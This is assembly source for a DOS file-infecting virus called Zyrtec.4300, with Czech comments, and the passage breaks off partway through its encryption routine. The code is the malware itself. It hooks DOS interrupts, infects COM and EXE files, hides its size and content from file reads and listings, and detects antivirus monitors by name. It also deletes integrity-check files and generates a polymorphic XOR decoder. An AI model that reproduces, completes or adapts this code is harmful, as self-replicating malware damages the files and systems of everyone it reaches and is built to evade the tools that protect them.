; +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;
;	Jmeno programu :	Zyrtec.4300
;
;	Popis programu :	VIRUS	(Resident,Polymorphic,Com,Exe,Stealth)
;
;	Autor programu :	Pavel Pech	DECEMBER 1996
;
;	!!!!! TESTOVACI BETA VERZE !!!!!		; LINECHANGE
;
; +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

A	SEGMENT BYTE PUBLIC
	ASSUME CS:A, DS:A
	ORG 100h

START:  JMP	First

; *****************************************************************************
; VIRUS - DATA
; *****************************************************************************
BegDat:
	DW	0		;0		Vel. potrebna na skok na 1.IP
	DW	4413-3		;2		Velikost viru LINECHANGE 4303-3
	DB	0		;4		Pamet pro vir v paragrafech LSB
	DD	0		;5		Old INT 21h address (@ES:BX)
	DB	032h,0DFh
	DB	22 DUP (0FFh)	;9		Puvodni zacatek programu
	DB	0		;33		Byt na pozici 1387h
	DW	0		;34		Word na pozici += ? * 256
	DB	0		;36		Novy ID bajt
	DW	0		;37		Vel hlavicky v bytech
	DW	0		;39		Puvodni atributy souboru
	DD	0		;41		Puvodni datum a cas
	DB	0E9h,0,0	;45		JMP na telo viru
	DD	0		;48		Ulozeni @DS:DX
	DW	0		;52		Offset of filename
	DD	0		;54		Velikost programu (@DX:AX)
	DD	0		;58		Old INT 23h address
	DD	0		;62		Old INT 24h address
	DB	0		;66		ID byt ; 1 - DO NOTHING
	DB	0		;67		ID byt ; AH fce (4Bh,3Ch ...)
	DB	'MEM.E'		;68		String #1
	DB	'CHKDSK.E'	;73		String #2
	DB	'WIN.'		;81		String #3
	PUSHF
	PUSH	cx
	MOV	cx,12
IL:	POP	ax
	LOOP	IL
	POP	cx
	POPF
	STC
	IRET			;85		Nove INT 23h,24h
	DB	080h,0FCh,03Dh
	DB	075h,003h,0E9h	;97		ID String - AVGSYS.EXE
	DB	0		;103		Je program trasovan ?
	DB	0		;104		UMB ?
	DB	0		;105		Pamet pro vir v paragrafech MSB
	DW	0		;106		Fce 3Ch,5Bh - Handle
	DW	0		;108		Fce 3Dh - Handle
	DD	1		;110		Generace viru (AX:DX)
	DB	080h,0FCh,03Dh
	DB	075h,02Bh,050h	;114		ID String - FGUARD.COM
	DB	016h,000h,001h
	DB	075h,0EBh,0FBh	;120		ID String - TBCHECK.COM
	DB	'ARJ.E'		;126		String #4
	DB	'RAR.E'		;131		String #5
	DB	'PKZIP.E'	;136		String #6
	DB	'CHKLIST.MS',0	;143		String #7
	DB	'AVGSY'		;154		TSR AntiVir #1
	DB	'FGUAR'		;159		TSR AntiVir #2
	DB	'TBCHE'		;164		TSR AntiVir #3
	DB	'TBFIL'		;169		TSR AntiVir #4
	DB	'TBMEM'		;174		TSR AntiVir #5
	DB	'VMONI'		;179		TSR AntiVir #6
	DB	'VSAFE'		;184		TSR AntiVir #7
	DB	'VSECU'		;189		TSR AntiVir #8
	DB	016h,000h,001h
	DB	075h,01Dh,0FCh	;194		ID String - TBFILE.COM
	DB	016h,000h,005h
	DB	075h,01Ch,0FBh	;200		ID String - TBMEM.COM
	DB	080h,0FCh,03Dh
	DB	074h,03Eh,080h	;206		ID String - VMONITOR.COM
	DB	0EAh,045h,009h
	DB	000h,000h,0FBh	;212		ID String - VSAFE.COM
	DB	080h,0FCh,04Bh
	DB	074h,05Ch,080h	;218		ID String - VSECURE.COM
	DB	0		;224		Je akce Destroy OK ? (!=0)
	DB	02Eh,0FFh,02Eh
	DB	0C3h,00Dh	;225		New VSAFE String
	DB	'C$07P'		;230		DISK C: LABEL !
	DW	0		;235		XOR zavadece
	DB	0		;237		XOR rezideni casti
	DB	0		;238		XOR F_Read

	DB	25 DUP(0)	;!!!					LINEDEL
				;					LINEDEL
	DB	'L!P'		;264		Soub. kt. napada	LINEDEL
	DB	'l!p'		;267		Soub. kt. napada	LINEDEL

	; FOR 2521h TOTAL DATA SIZE : 270+2	; LINECHANGE 239+2

EndDat	DW	$-BegDat+2

; *****************************************************************************
; VIRUS - INT 21h
; *****************************************************************************
BegINT: PUSHF
	PUSH	ax
	PUSHF
	POP	ax
	AND	ah,1
	POP	ax
	JZ	NTrace
	JMP	SHORT Trace			; jsem trasovan ?

AccXX1	DB	08Dh

NTrace:	MOV	BYTE PTR cs:[0067],ah		; uloz volanou sluzbu

	CMP	ah,69h
	NOP
	JNE	Cont1
	JMP	Iam				; test pritomnosti viru

Cont1:	JNE	UccXX2
AccXX2	DB	03Bh
UccXX2:	CMP	BYTE PTR cs:[0066],1
	JNE	Cont2
Trace:	JMP	Cont17				; je spusten CHKDSK nebo Comp ?

Cont2:	CMP	ax,4B00h
	JNE	Cont3
	JE	OKAtt
AccXX3	DB	080h
OKAtt:	JMP	Attack				; napadni soubor

Cont3:	CMP	ah,3Fh
	JNE	Cont4
	CMP	bx,5
	JB	Cont4
	CMP	WORD PTR cs:[0108],bx
	JNE	Cont4
	JE	OKFRe
AccXX4	DB	084h
OKFRe:	JMP	F_Read				; maskuj obsah souboru

Cont4:	CMP	ah,3Eh
	JNE	Cont5
	CMP	bx,5
	JB	Cont5
	POPF
	CALL	I21h
	PUSHF
	CLC
	JNC	OKAtt2
AccXX5	DB	0D1h
OKAtt2:	JMP	Attack				; napadni soubor

Cont5:	CMP	ah,3Ch
	JNE	Cont6
	JMP	GetFle				; ziskej Handle

Cont6:	CMP	ah,5Bh
	JNE	Cont7
	JMP	GetFle				; ziskej Handle

Cont7:	CMP	ax,6C00h
	JNE	Cont8
	JMP	GetFle				; ziskej Handle

Cont8:	CMP	ah,56h
	JNE	Cont9
	JE	OkAtt3
AccXX6	DB	0E4h
OkAtt3:	JMP	Attack				; napadni soubor

Cont9:	CMP	ah,4Eh
	JNE	Cont10
	JMP	F_FindA				; maskuj velikost souboru

Cont10:	CMP	ah,4Fh
	JNE	Cont11
	JMP	F_FindB				; maskuj velikost souboru

Cont11:	CMP	ah,11h
	JNE	Cont12
	JMP	F_FFCB				; maskuj velikost souboru

Cont12:	CMP	ah,12h
	JNE	Cont13
	JMP	F_FFCB				; maskuj velikost souboru

Cont13:	CMP	ah,3Dh
	JNE	Cont14
	JMP	GetFl2				; ziskej Handle

Cont14:	CMP	ax,4202h
	JNE	Cont15
	CMP	bx,5
	JB	Cont15
	CMP	WORD PTR cs:[0108],bx
	JNE	Cont15
	JE	OKFSi
AccXX7	DB	0CAh
OKFSi:	JMP	F_Size				; maskuj velikost souboru

Cont15:	CMP	ah,0Eh
	JNE	Cont16
	JMP	DELMS				; smaz CHKLIST.MS

Cont16:	CMP	ah,3Bh
	JNE	Cont17
	JMP	DELMS				; smaz CHKLIST.MS

Cont17:	CMP	ah,4Dh
	JNE	IQuit
	MOV	BYTE PTR cs:[0066],0		; nuluj priznak aktivity
	PUSH	cx
	MOV	cx,0FFFFh
Delay:	LOOP	Delay
	POP	cx

IQuit:	POPF
	JMP	DWORD PTR cs:[0005]		; pokracuj v preruseni

; *****************************************************************************
; VIRUS - FUNCTIONS
; *****************************************************************************
Iam:	CMP	al,2Ch
	JNE	IQuit
	ROL	cx,cl
	NOT	cx
	POPF
	IRET					; je virus aktivni v pameti ?

Attack:	PUSH	ax
	CALL	SveAll				; ulozi obsahy registru

	MOV	ah,BYTE PTR cs:[0067]		; obnov cislo volane sluzby

	CMP	ah,3Eh
	JNE	DSDXOK				; je volana funkce 3Eh ?

	PUSH	cs
	POP	ds
	MOV	dx,WORD PTR cs:[0002]
	CMP	bx,WORD PTR cs:[0106]
	JE	New
	JMP	NIC
New:	ADD	dx,30
	MOV	WORD PTR cs:[0106],0		; je moznost infekce ?

DSDXOK:	CALL	RP2324				; nahradi obsluhy INT 23h,24h

	MOV	WORD PTR cs:[0048],dx
	MOV	WORD PTR cs:[0050],ds		; uloz ^@ASCIIZ do dat

	PUSH	ds
	POP	es
	MOV	di,dx
	CLD
	MOV	cx,129
	CALL	CORE
	JC	RunOK
	JMP	AQuit				; je soubor COM,EXE nebo jiny ?

RunOK:	STD
	MOV	al,'\'
	MOV	cx,129
	REPNE	SCASB
	CMP	di,dx
	JAE	Drive
	MOV	di,dx
	JMP	SHORT Igot
Drive:	ADD	di,2				; DI - ofset zac. jmena souboru

Igot:	MOV	ax,di				; uloz DI do AX

	PUSH	cs
	POP	ds				; DS = CS

	CLD					; Clear Direction (DF==0)

	MOV	cx,4
	MOV	si,81
	REPE	CMPSB
	JNZ	NoInf
	JMP	AQuit				; jedna se o soubor 'WIN.' ?

	MOV	di,ax
	MOV	cx,3
	MOV	si,154
	REPE	CMPSB
	JNZ	NoInf
	JMP	AQuit				; jedna se o soubor 'AVG' ?

NoInf:	CMP	BYTE PTR cs:[0067],4Bh
	JNE	NoRun				; je volana funkce 4B00h ?

	MOV	di,ax
	MOV	cx,5
	MOV	si,68
	REPE	CMPSB
	JNZ	NoMEM
	JMP	F_MEM				; je spusten 'MEM.EXE' ?

NoMEM:	MOV	di,ax
	MOV	cx,8
	MOV	si,73
	REPE	CMPSB
	JNZ	NoCHK
	JMP	F_CHK				; je spusten 'CHKDSK.EXE' ?

NoCHK:
	MOV	di,ax				;			LINEDEL
	MOV	cx,5				;			LINEDEL
	MOV	si,184				;			LINEDEL
	REPE	CMPSB				;			LINEDEL
	JZ	ReMove				; je spusten 'VSAFE' ?	LINEDEL

	MOV	di,ax
	MOV	cx,5
	MOV	si,126
	REPE	CMPSB
	JZ	Comp				; je spusten 'ARJ.EXE' ?

	MOV	di,ax
	MOV	cx,5
	MOV	si,131
	REPE	CMPSB
	JZ	Comp				; je spusten 'RAR.EXE' ?

	MOV	di,ax
	MOV	cx,7
	MOV	si,136
	REPE	CMPSB
	JZ	Comp				; je spusten 'PKZIP.EXE' ?

NoRun:
	MOV	di,ax				;			LINEDEL
	MOV	cx,3				;			LINEDEL
	MOV	si,264				; IMM	'\L!P' - zac na	LINEDEL
	REPE	CMPSB				; 			LINEDEL
	CMP	cx,0				; 			LINEDEL
	JE	D				;			LINEDEL
						;			LINEDEL
	MOV	di,ax				;			LINEDEL
	MOV	cx,3				;			LINEDEL
	MOV	si,267				; IMM	'\l!p' - zac na	LINEDEL
	REPE	CMPSB				;			LINEDEL
	CMP	cx,0				;			LINEDEL
	JE	D				;			LINEDEL
						;			LINEDEL
	JMP	AQuit				;			LINEDEL
D:						;			LINEDEL
						;			LINEDEL
						;			LINEDEL

	JMP	SHORT NoSpec			; nespecifikovany soubor

ReMove:	CALL	FLMCB				;			LINEDEL
	ADD	WORD PTR es:[0003],dx		; "zvetsi" vel. voln    LINEDEL
						;			LINEDEL
	MOV	ax,2521h			;			LINEDEL
	MOV	ds,WORD PTR cs:[0007]		;			LINEDEL
	MOV	dx,WORD PTR cs:[0005]		;			LINEDEL
	CALL	I21h				; nastav puvodni INT 21 LINEDEL
						;			LINEDEL
	CALL	SO2324				; nastav puvodni INT 23	LINEDEL
						;			LINEDEL
	CALL	LodAll				;			LINEDEL
	POP	ax				;			LINEDEL
	JMP	IQuit				; odinstaluj se z pamet LINEDEL

Comp:	MOV	BYTE PTR cs:[0066],1		; priznak spusteni vybr. soub.

	CALL	SO2324				; nastav puvodni INT 23h,24h

	CALL	LodAll
	POP	ax				; obnov puvodni registry

	JMP	IQuit				; "spust" specifikovany soubor

F_CHK:	MOV	BYTE PTR cs:[0066],1		; priznak spusteni vybr. soub.

F_MEM:	CALL	FLMCB
	ADD	WORD PTR es:[0003],dx		; "zvetsi" vel. volne pameti

	CALL	SO2324				; nastav puvodni INT 23h,24h

	CALL	LodAll
	POP	ax				; obnov puvodni registry

	CALL	DWORD PTR cs:[0005]		; "spust" specifikovany soubor

	PUSHF
	PUSH	ax
	CALL	SveAll				; uloz registry

	CALL	FLMCB
	SUB	WORD PTR es:[0003],dx		; "zmensi" vel. volne pameti

	MOV	BYTE PTR cs:[0066],0		; nuluj priznak aktivity

	CALL	LodAll
	POP	ax
	POPF
	RETF	2				; navrat do DOSu

NoSpec:	MOV	dx,WORD PTR cs:[0048]
	MOV	ds,WORD PTR cs:[0050]		; obnov @DS:DX z dat

	CALL	Open
	JNC	C1
	JMP	AQuit				; otevri soubor

C1:	CALL	Down				; SEEK nakonec souboru

	CMP	dx,0
	JNE	C2
	CMP	ax,10000
	JA	C2
	JMP	OldDT				; je velikost souboru > 10000

C2:	MOV	WORD PTR cs:[0046],ax
	MOV	WORD PTR cs:[0048],ax
	MOV	WORD PTR cs:[0050],dx		; uchovej velikost souboru

	CALL	SOK
	JNC	NINF
	JMP	OldDT				; je uz soubor napaden ?

NINF:	CALL	Back				; SEEK nazacatek

	PUSH	cs
	POP	ds				; DS = CS

	MOV	ah,3Fh
	MOV	dx,9
	MOV	cx,24
	CALL	I21h
	JNC	ROk
	JMP	OldDT				; nactu prvnich 24 bytu do dat

ROk:	CALL	Decode3				; dekoduj cast prgu

	CALL	Back
	MOV	ah,3Fh
	MOV	dx,WORD PTR cs:[0002]
	ADD	dx,6
	MOV	bp,dx
	MOV	cx,24
	CALL	I21h				; nactu prvnich 24 bytu do mem

	CMP	WORD PTR cs:[bp],'ZM'
	JE	ToExe				; je to EXE nebo COM soubor ?

	CMP	WORD PTR cs:[0048],59000
	JB	C8
	JMP	OldDT				; je jeho velikost <= 59000

C8:	MOV	ax,WORD PTR cs:[0046]
	SUB	ax,3
	ADD	ax,WORD PTR cs:[0000]
	MOV	WORD PTR cs:[0046],ax		; vypocteni ofsetu pro JMP

	CALL	SetIDS				; nastavim poznavaci znacku

	CALL	Down				; SEEK nakonec souboru

	CALL	Write				; zapisu se nakonec

	CALL	Back				; SEEK nazacatek

	MOV	ah,40h
	MOV	cx,3
	MOV	dx,45
	CALL	I21h				; zapisu JMP xxxxh

	JMP	OldDT				; konec napadani *.COM

ToExe:	XOR	dx,dx
	MOV	ax,WORD PTR cs:[bp+4]
	DEC	ax
	MOV	cx,0200h
	MUL	cx				; AX = (PocStran-1)*512

	MOV	cx,WORD PTR cs:[bp+2]
	ADD	ax,cx
	ADC	dx,0				; DX:AX += PocBytu v PoslStr

	MOV	di,WORD PTR cs:[0048]
	MOV	cx,WORD PTR cs:[0050]
	CMP	ax,di
	JNE	NoE
	CMP	cx,dx
	JNE	NoE				; je soubor fragmentovan ?

	JMP	ANO				; neni, pokracuj

NoE:	JMP	OldDT				; je, skonci

ANO:	PUSH	bx				; uloz FileHandle

	MOV	bx,WORD PTR cs:[bp+8]
	MOV	cl,4
	SHL	bx,cl
	PUSH	bx
	SUB	ax,bx
	SBB	dx,0				; DX:AX -= VelHlavicky (v Byt.)

	MOV	WORD PTR cs:[0037],bx		; ulozeni velikosti hlavicky

	PUSH	ax
	PUSH	dx				; uloz DX:AX

	PUSH	ax
	SHL	al,cl
	SHR	al,cl
	XOR	bx,bx
	MOV	bl,al
	PUSH	bx
	ADD	bx,WORD PTR cs:[0000]
	MOV	WORD PTR cs:[bp+14h],bx
	SUB	bx,259
	MOV	WORD PTR cs:[0046],bx
	POP	bx
	ADD	bx,WORD PTR cs:[0002]
	ADD	bx,1024
	AND	bl,11111110b
	MOV	WORD PTR cs:[bp+10h],bx
	POP	ax				; novy IP,SP

	SHR	ax,cl
	SHL	dl,cl
	ADD	ah,dl
	MOV	WORD PTR cs:[bp+16h],ax
	AND	al,11111110b
	MOV	WORD PTR cs:[bp+0Eh],ax		; novy CS,SS

	POP	dx
	POP	ax				; obnov DX:AX

	ADD	ax,WORD PTR cs:[0002]
	ADC	dx,0				; DX:AX += VelikostViru

	POP	bx
	ADD	ax,bx
	ADC	dx,0
	MOV	cx,0200h
	DIV	cx
	MOV	WORD PTR cs:[bp+2],dx
	INC	ax
	MOV	WORD PTR cs:[bp+4],ax		; nova velikost souboru

	POP	bx				; obnov FileHandle

	CALL	SetIDS				; nastavim poznavaci znacku

	CALL	Down				; SEEK nakonec souboru

	CALL	Write				; zapisu se nakonec

	CALL	Back				; SEEK nazacatek

	MOV	ah,40h
	MOV	cx,24
	MOV	dx,bp
	CALL	I21h				; zapis novou hlavicku

OldDT:	CALL	Close				; zavri soubor

AQuit:	CALL	SO2324				; obnov puvodni obsluhy

NIC:	CALL	LodAll
	POP	ax				; obnov puvodni registry

	CMP	BYTE PTR cs:[0067],3Eh
	JNE	NoRF				; je volana fce 3Eh ?

	POPF
	RETF	2				; skonci

NoRF:	JMP	IQuit				; pokracuj v preruseni

GetFle:	POPF
	CALL	I21h
	PUSHF
	JC	QGETF				; zavolej fc. 3Ch,5Bh,6Ch / 21h

	PUSH	ax
	MOV	WORD PTR cs:[0048],ax
	CALL	SveAll				; uloz registry

	XOR	bp,bp
	CMP	BYTE PTR cs:[0067],6Ch
	JNE	NoX
	MOV	dx,si
NoX:	PUSH	dx
	POP	di
	PUSH	ds
	POP	es
	MOV	cx,129
	CALL	CORE
	JNC	QME				; jedna se o COM,EXE nebo jiny ?

	MOV	bp,WORD PTR cs:[0048]
	MOV	si,dx
	MOV	di,WORD PTR cs:[0002]
	ADD	di,30
	PUSH	cs
	POP	es
	MOV	cx,48
	REP	MOVSW				; uloz ASCIIZ

QME:	MOV	WORD PTR cs:[0106],bp
	CALL	LodAll
	POP	ax				; obnov registry

QGETF:	POPF
	RETF	2				; skonci

GetFl2: POPF
	CALL	I21h
	PUSHF
	JC	QFl2				; zavolej funkci 3Dh / 21h

	PUSH	ax
	MOV	WORD PTR cs:[0048],ax
	CALL	SveAll				; uloz registry

	PUSH	ds
	XOR	bp,bp
	POP	es
	PUSH	dx
	POP	di
	MOV	cx,129

	CALL	CORE
	JNC	QRes				; je COM,EXE ?

	MOV	ax,3D02h
	CALL	I21h
	JC	QRes
	MOV	bx,ax				; otevri soubor

	CALL	TSTINF
	JNC	QRes				; je napaden ?

	MOV	bp,WORD PTR cs:[0048]
QRes:	MOV	WORD PTR cs:[0108],bp		; uloz Handle

	CALL	LodAll
	POP	ax				; obnov registry

QFl2:	POPF
	RETF	2				; skonci

F_Size:	POPF
	CALL	I21h
	PUSHF
	JC	QFS				; zavolej funkci 4202h / 21h

	SUB	ax,WORD PTR cs:[0002]
	SBB	dx,0				; zmensi velikost

	PUSH	ax
	PUSH	cx
	PUSH	dx				; uloz AX,CX,DX

	MOV	cx,dx
	MOV	dx,ax
	MOV	ax,4200h
	CALL	I21h				; SEEK na danou pozici

	POP	dx
	POP	cx
	POP	ax				; obnov DX,CX,AX

QFS:	POPF
	RETF	2				; skonci

F_Read:	POPF
	CALL	I21h
	PUSHF
	JNC	CRe1
Zero:	JMP	CF1				; zavolej funkci 3Fh / 21h

CRe1:	PUSH	ax
	CALL	SveAll
	PUSH	cs
	LEA	cx,X_To
	LEA	di,X_From
	SUB	cx,di
	SUB	di,103h
	MOV	si,238
	POP	ds
	LODSB
DekFR:	XOR	[di],al
	INC	di
	LOOP	DekFR
	CALL	LodAll
	POP	ax				; dekoduj sluzbu

X_From:	CMP	ax,0
	JE	Zero				; nacetl neco ?

	MOV	WORD PTR cs:[0037],ax
	MOV	WORD PTR cs:[0048],ax
	MOV	WORD PTR cs:[0050],dx
	CALL	SveAll				; uloz registry

	MOV	ax,4201h
	XOR	cx,cx
	XOR	dx,dx
	CALL	I21h
	MOV	WORD PTR cs:[0054],ax
	MOV	WORD PTR cs:[0056],dx
	PUSH	ax
	MOV	si,ax
	MOV	di,dx
	PUSH	di				; uloz aktualni pozici v soub.

	CALL	Down
	SUB	ax,WORD PTR cs:[0002]
	SBB	dx,0				; zjisti puvodni vel. soub.

	CMP	dx,di
	JA	NL
	JB	LL
	CMP	ax,si
	JA	NL
LL:	SUB	si,ax
	SBB	di,dx
	SUB	WORD PTR cs:[0037],si
	SUB	WORD PTR cs:[0054],si
	SBB	WORD PTR cs:[0056],0		; cte za puvodni konec souboru ?

NL:	POP	di
	POP	si
	SUB	si,WORD PTR cs:[0048]
	SBB	di,0				; SI:DI pozice zacatku cteni

	CMP	di,0
	JNE	NTRep				; cetl od 0:FFFFh ?

	PUSH	ds
	PUSH	cs
	MOV	ax,4202h
	MOV	cx,0FFFFh
	MOV	dx,WORD PTR cs:[0002]
	NOT	dx
	ADD	dx,1+9
	CALL	I21h
	POP	ds
	MOV	ah,3Fh
	MOV	cx,28
	MOV	dx,9
	CALL	I21h
	CALL	Decode3
	POP	ds				; RE-SET VIRUS DATA from file

	PUSH	si
	CMP	si,24
	JA	NoBeg				; je < 24 ?

	PUSH	ds
	PUSH	ds
	POP	es
	MOV	di,WORD PTR cs:[0050]
	PUSH	cs
	POP	ds
	ADD	si,9
	MOV	cx,WORD PTR cs:[0048]
	CMP	cx,24
	JBE	Repce
	MOV	cx,24
Repce:	REP	MOVSB
	POP	ds				; nahrad zacatek

NoBeg:	POP	si
	MOV	di,1387h
	CALL	CteHo
	JNC	No1387
	MOV	cl,BYTE PTR cs:[0033]
	CALL	RepHo				; cte 1387h ?

No1387:	MOV	ah,BYTE PTR cs:[0036]
	XOR	al,al
	ADD	di,ax
	INC	di
	CALL	CteHo
	JNC	NoLow
	MOV	cl,BYTE PTR cs:[0034]
	CALL	RepHo				; cte 255 dolni ?

NoLow:	INC	di
	CALL	CteHo
	JNC	NTRep
	MOV	cl,BYTE PTR cs:[0035]
	CALL	RepHo				; cte 255 horni ?

NTRep:	MOV	ax,4200h
	MOV	dx,WORD PTR cs:[0054]
	MOV	cx,WORD PTR cs:[0056]
	CALL	I21h				; SEEK na urcenou pozici

X_To:	CALL	LodAll
	MOV	ax,WORD PTR cs:[0037]		; obnov a uprav registry

CF1:	PUSH	ax
	CALL	SveAll
	PUSH	cs
	LEA	cx,X_To
	LEA	di,X_From
	SUB	cx,di
	SUB	di,103h
	CALL	XR
	POP	ds
	MOV	BYTE PTR ds:[0238],al
KodFR:	XOR	[di],al
	INC	di
	LOOP	KodFR
	CALL	LodAll
	POP	ax				; zakoduj sluzbu

	POPF
	RETF	2				; skonci

DELMS:	POPF
	CALL	I21h
	JC	QDELMS				; zavolej puvodni fci

	PUSHF
	PUSH	ax
	MOV	ah,40h
	OR	ah,1
	PUSH	dx
	PUSH	ds
	PUSH	cs
	POP	ds
	MOV	dx,143
	CALL	I21h
	POP	ds
	POP	dx
	POP	ax
	POPF					; smaz soubor CHKLIST.MS

QDELMS:	RETF	2				; skonci

; *****************************************************************************
; VIRUS - PROCEDURES
; *****************************************************************************
I21h:	CLI
	PUSHF
	CALL	DWORD PTR cs:[0005]
	STI
	RETN					; nahrada instrukce INT 21h

RP2324:	PUSH	ds
	PUSH	dx
	MOV	ax,3523h
	CALL	I21h
	MOV	WORD PTR cs:[0058],bx
	MOV	WORD PTR cs:[0060],es
	MOV	ax,3524h
	CALL	I21h
	MOV	WORD PTR cs:[0062],bx
	MOV	WORD PTR cs:[0064],es
	PUSH	cs
	POP	ds
	MOV	ax,2523h
	MOV	dx,96
	CALL	I21h
	MOV	dx,85
	MOV	ax,2524h
	CALL	I21h
	POP	dx
	POP	ds
	RETN					; RePlace INT 23h,24h

SO2324: MOV	ax,2523h
	MOV	dx,WORD PTR cs:[0060]
	MOV	ds,dx
	MOV	dx,WORD PTR cs:[0058]
	CALL	I21h
	MOV	al,24h
	MOV	dx,WORD PTR cs:[0064]
	MOV	ds,dx
	MOV	dx,WORD PTR cs:[0062]
	CALL	I21h
	RETN					; nastavim puvodni INT 23,24

CORE:	MOV	al,'.'
	REPNE	SCASB
ESDICE:	CMP	es:[di],'XE'
	JE	T1
	CMP	es:[di],'xe'
	JE	T2
	CMP	es:[di],'OC'
	JE	T3
	CMP	es:[di],'oc'
	JE	T4
	JMP	SHORT No
T1:	CMP	BYTE PTR es:[di+2],'E'
	JE	Yes
	JNE	No
T2:	CMP	BYTE PTR es:[di+2],'e'
	JE	Yes
	JNE	No
T3:	CMP	BYTE PTR es:[di+2],'M'
	JE	Yes
	JNE	No
T4:	CMP	BYTE PTR es:[di+2],'m'
	JE	Yes				; porovnej koncovku

No:	CLC
	RETN					; je jiny => CF==0

Yes:	STC
	RETN					; je COM nebo EXE => CF==1

FLMCB:	CMP	BYTE PTR cs:[0104],1
	JNE	ConvM
	CALL	FLUMB
	JNC	ConvM
	MOV	dh,BYTE PTR cs:[0105]
	MOV	dl,BYTE PTR cs:[0004]
	RETN
ConvM:	MOV	ah,52h
	CALL	I21h
	MOV	es,es:[bx-2]
	MOV	ax,es
TM:	CLC
	JNC	UccA1
AccA1	DB	3
UccA1:	CMP	BYTE PTR es:[0000],'Z'
	JE	QM
	ADD	ax,es:[0003]
	INC	ax
	PUSH	ax
	POP	es
	JMP	TM
QM:	MOV	dh,BYTE PTR cs:[0105]
	MOV	dl,BYTE PTR cs:[0004]
	RETN					; procedura FindLastMCB v ES

Open:	MOV	ax,4300h
	CALL	I21h
	MOV	WORD PTR cs:[0039],cx		; zjisti atributy souboru

	MOV	ax,4301h
	MOV	cx,20h
	CALL	I21h				; nastav archive atributy

	MOV	ax,3D02h
	CALL	I21h
	JC	QOpen
	MOV	bx,ax				; otevri soubor R/W

	MOV	ax,5700h
	CALL	I21h
	MOV	WORD PTR cs:[0041],dx
	MOV	WORD PTR cs:[0043],cx		; uloz datum a cas

QOpen:	RETN					; navrat

Close:	MOV	ax,5701h
	MOV	cx,WORD PTR cs:[0043]
	MOV	dx,WORD PTR cs:[0041]
	CALL	I21h				; nastav puvodni datum a cas

	MOV	ah,3Eh
	CALL	I21h				; zavri soubor

	MOV	ax,4301h
	MOV	cx,WORD PTR cs:[0039]
	MOV	dx,WORD PTR cs:[0048]
	MOV	ds,WORD PTR cs:[0050]
	CALL	I21h
	RETN					; nastav puvodni atributy

TSTINF:	CALL	Down
	CMP	dx,0
	JNE	SOK
	CMP	ax,10000
	JB	TNI				; je velikost souboru > 10000

SOK:	CALL	S1387				; SEEK 1387

	PUSH	cs
	POP	ds
	MOV	ah,3Fh
	MOV	dx,33
	MOV	cx,1
	CALL	I21h
	JC	TNI				; nactu 1 bajt

	MOV	si,dx
	LODSB
	CMP	al,0
	JE	TNI
	CMP	al,7
	JA	TNI
	MOV	BYTE PTR cs:[0036],al		; je v intervalu <1..7> ?

	CALL	Sb256
	JC	TNI				; SEEK dale

	CALL	ACD				; read AX,CX,DX

	ADD	ax,cx
	NOT	ax
	CMP	ax,dx
	JNE	TNI				; souctovy test

	STC
	RETN					; Infected => CF==1

TNI:	CLC
	RETN					; Not Infected => CF==0

SetIDS:	MOV	ah,2Ch
	CALL	I21h
	MOV	cl,5
	SHL	dl,cl
	SHR	dl,cl
	CMP	dl,0
	JNE	RND_OK
	INC	dl
RND_OK:	MOV	al,dl
	MOV	BYTE PTR cs:[0036],al
	MOV	di,WORD PTR cs:[0002]		; AL = RND# <1..7>

	PUSH	cs
	POP	es				; ES = CS

	STOSB
	DEC	di				; uloz do pameti (@ES:DI)

	PUSH	ax				; uloz AX (v AL RND# Byte)

	CALL	S1387				; SEEK 1387

	MOV	ah,40h
	MOV	cx,1
	PUSH	di
	POP	dx
	CALL	I21h				; zapisu do souboru ID bajt

	POP	ax
	MOV	BYTE PTR cs:[0036],al		; v AL RND# Byte

	CALL	Sb256				; SEEK dale

	PUSH	ax
	PUSH	dx				; uloz FilePos

	CALL	ACD				; read AX,CX,DX

	MOV	WORD PTR cs:[0034],dx		; ulozim puvodni WORD

	ADD	ax,cx
	NOT	ax
	STOSW
	SUB	di,2				; ulozim SOUCET (@ES:DI)

	POP	cx
	POP	dx				; obnov FilePos

	MOV	ax,4200h
	CALL	I21h				; SEEK + RND #7

	MOV	dx,di
	MOV	cx,2
	MOV	ah,40h
	CALL	I21h				; zapis ID WORD

	RETN					; navrat

ACD:	MOV	dx,WORD PTR cs:[0002]
	MOV	di,dx
	MOV	ah,3Fh
	MOV	cx,6
	CALL	I21h				; nacti 3 WORDy

	MOV	si,dx
	LODSW
	MOV	dx,ax
	LODSW
	MOV	cx,ax
	LODSW
	RETN					; ktere jsou v DX,CX a AX

MOJE:	SHR	dl,1
	TEST	dl,1
	JZ	DIN
	INC	di
DIN:	RETN					; bude dalsi instrukce posunuta

UData:	CALL	SveAll
	MOV	cx,83
	MOV	dx,WORD PTR cs:[0043]
	MOV	ax,68
	XOR	bx,bx
	CALL	Decode2
	CALL	LodAll
	RETN					; zakoduj cast prgu

Write:	CALL	UData				; zakoduj cast prgu

	CALL	SveAll
	PUSH	cs
	POP	es
	MOV	cx,21
	MOV	di,WORD PTR cs:[0000]
	PUSH	di
	MOV	al,9Fh
	REP	STOSB				; generuj GARBAGE INSTRUCTIONS

	POP	di
	CALL	XR
	MOV	dl,al
	CALL	MOJE
	MOV	al,0BBh
	STOSB
	MOV	ax,WORD PTR cs:[0046]
	ADD	ax,280
	STOSW					; generuj dekod. instrukci #1

	CALL	MOJE
	MOV	al,0B9h
	STOSB
	MOV	ax,653				; velikost zavadece
	STOSW					; generuj dekod. instrukci #2

	CALL	MOJE
	MOV	bx,di				; pro vypocteni ofsetu pro LOOP

	MOV	al,02Eh
	STOSB
	MOV	ax,3781h
	STOSW
	MOV	ax,WORD PTR cs:[0235]
	STOSW					; generuj dekod. instrukci #3

	SHR	dl,1
	INC	di
	MOV	al,43h
	STOSB					; generuj dekod. instrukci #4

	CALL	MOJE
	MOV	al,43h
	STOSB					; generuj dekod. instrukci #5

	CALL	MOJE
	MOV	cx,di
	SUB	cx,bx				; cx info pro instrukci LOOP

	MOV	al,0E2h
	STOSB
	MOV	al,0FEh
	SUB	al,cl
	STOSB					; generuj dekod. instrukci #6

	CALL	LodAll				; vygeneruj 1 ze 32 dek. smycek

	CALL	XR
	MOV	dl,al
	MOV	BYTE PTR cs:[0237],dl		; cim budu XORovat rezident ?

	CALL	XXX1				; zjisti ofset externi fce

	MOV	di,272				;	LINECHANGE 241
	MOV	cx,2809				; velikost rezidentu LINECH 2730
	MOV	al,BYTE PTR cs:[0237]
CODTSR:	XOR	BYTE PTR [di],al
	INC	di
